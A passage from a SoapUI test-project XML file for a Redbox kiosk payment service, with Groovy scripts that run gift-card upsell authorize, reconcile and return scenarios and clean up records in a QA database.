con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d7e65004-1953-419d-8f1a-edeba3ca5d9c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f8e37a9f-a85c-4b06-b249-11958c3f2b11</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="ee633be7-ab60-4965-b248-e3266c682565" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="GiftCard-Upsell" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="24ef5267-f926-4786-95da-1a087ad1f7c4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="e9004a06-e04b-4702-ac10-ed5bb66185e2"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>Upsell</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:property>UpsellOffer</con:property><con:property>UpsellOfferStatus</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="f75db746-1427-4ee2-a951-90eb4714c1ad"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="f23064f1-8df2-4237-b45e-f6f6ef3cbcc3"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "true");
tc.setPropertyValue("UpsellOffer", context.expand( '${DataSource#UpsellOffer}' ));
tc.setPropertyValue("UpsellOfferStatus", context.expand( '${DataSource#UpsellOfferStatus}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [GCAuthorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="abf3162b-2e12-433c-b426-0b5bdcfdef58"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Reconcile" id="f54d2e38-66c0-499d-97b7-2d3640bfd32d"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("UpsellOffer", authtc.getPropertyValue("UpsellOffer"));
tc.setPropertyValue("UpsellOfferStatus", authtc.getPropertyValue("UpsellOfferStatus"));
tc.setPropertyValue("UpsellTypeId", authtc.getPropertyValue("UpsellTypeId"));
tc.setPropertyValue("ProductGroupId", authtc.getPropertyValue("ProductGroupId"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Copy of Manual" id="0d28f4ec-a282-405f-a8c9-b22c089f80bc"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Return" id="5ead54c4-820f-421f-8784-d73b562e8f8d"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="8eb45d05-0eda-487a-aafe-03f371130218" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="da1a35bb-8fa2-451e-9a89-ecc964e95924" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,75692) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,75692)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1687218</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148761258</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">75527813105188</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return FINISHED</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value/></con:property><con:property><con:name>StartTime</con:name><con:value>03/06/18-15:54:42.836</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>03/06/18-15:54:59.176</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:properties><con:property><con:name>TotalScenarioCount</con:name><con:value>327</con:value></con:property></con:properties><con:setupScript>log.info ("Kiosk Service Endpoint:"+  context.expand( '${#Project#KSEndpoint}' ));
testSuite.setPropertyValue("TotalScenarioCount", "0");</con:setupScript><con:tearDownScript>def totalScenarioCount = context.expand( '${#TestSuite#TotalScenarioCount}' )
log.info("/######################################################/");
//logging test cases ran
def tcResults = runner.getResults()
tcResults.each {
	def tcRunner = it
	def tcName = tcRunner.getTestCase().getName()
	def scenarioCount = context.expand( '${#[RentalScenarios#'+ tcName +']#ScenarioCount}' )
	log.info "TestCase: " + tcRunner.getTestCase().getName() + " STATUS:" + it.getStatus() + " ; Scenario Count : $scenarioCount"
}
log.info ("Total Scenario Count : $totalScenarioCount");
log.info("/#######################END###########################/");</con:tearDownScript><con:reportParameters/></con:testSuite><con:testSuite id="1a4846f8-e216-408c-82be-d9d211a82a23" name="Generic Steps (KioskService)"><con:description>Contains Generic Kiosk Service Steps. 
Like: PreAuth, Auth, Reconcile, Return. </con:description><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="PreAuth" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="ab14ebfa-b104-4a19-af46-10d69d639e6c" disabled="true"><con:description>DISABLED: No PreAuth is being used in production. Disabled it.</con:description><con:settings/><con:testStep type="groovy" name="Encode Message Body (PreAuth)" id="da8492b1-c89c-49c9-9d0d-edb1fc239db6" disabled="true"><con:settings/><con:config><script><![CDATA[//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
